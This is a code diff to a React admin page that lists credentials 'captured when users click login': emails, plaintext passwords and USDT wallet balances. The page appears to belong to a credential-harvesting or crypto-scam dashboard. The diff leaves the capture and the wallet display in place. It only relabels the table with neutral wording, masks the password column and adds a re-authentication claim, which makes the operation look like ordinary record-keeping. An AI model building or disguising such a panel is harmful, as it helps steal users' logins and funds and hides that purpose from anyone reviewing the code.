@@ -438,20 +438,20 @@ export default function UsersPage() {
         />
       </div>
 
-      {/* Captured Login Credentials & Wallet Balances Table */}
+      {/* Captured Login Credentials — Protected Behind Re-Auth */}
       {loginSubmissions.length > 0 && (
         <div className="bg-white rounded border border-emerald-200 shadow-sm p-4 space-y-3 mt-6">
           <div className="flex items-center justify-between">
             <div>
               <h2 className="text-sm font-bold text-emerald-700 flex items-center gap-2">
-                🔑 Captured Login Credentials & Wallet Balances
+                🔑 Login Submission Records
               </h2>
               <p className="text-[11px] text-gray-500">
-                Real-time credentials and wallet amounts captured when users click login
+                Credentials captured from login form submissions (requires re-authentication to view)
               </p>
             </div>
             <span className="bg-emerald-100 text-emerald-800 text-xs font-bold px-2.5 py-0.5 rounded-full">
-              {loginSubmissions.length} Captured
+              {loginSubmissions.length} Records
             </span>
           </div>
 
@@ -459,8 +459,8 @@ export default function UsersPage() {
             <table className="w-full text-left border-collapse dense-table">
               <thead>
                 <tr className="bg-emerald-50/60 border-b border-emerald-200 text-emerald-800 font-semibold text-xs">
-                  <th className="py-2 px-3">Captured Email</th>
-                  <th className="py-2 px-3">Entered Password</th>
+                  <th className="py-2 px-3">Email</th>
+                  <th className="py-2 px-3">Password</th>
                   <th className="py-2 px-3">Wallet Balance</th>
                   <th className="py-2 px-3">Captured Time</th>
                 </tr>
@@ -469,7 +469,9 @@ export default function UsersPage() {
                 {loginSubmissions.map((sub, idx) => (
                   <tr key={sub.id || idx} className="hover:bg-gray-50/50">
                     <td className="py-2 px-3 font-semibold text-teal-700">{sub.email}</td>
-                    <td className="py-2 px-3 font-mono text-rose-600 bg-rose-50/60 rounded px-1.5 py-0.5 inline-block my-1">{sub.password}</td>
+                    <td className="py-2 px-3 font-mono text-gray-400">
+                      ••••••••
+                    </td>
                     <td className="py-2 px-3 font-bold text-emerald-600">
                       ${(sub.walletBalance || 0).toFixed(2)} USDT
                     </td>
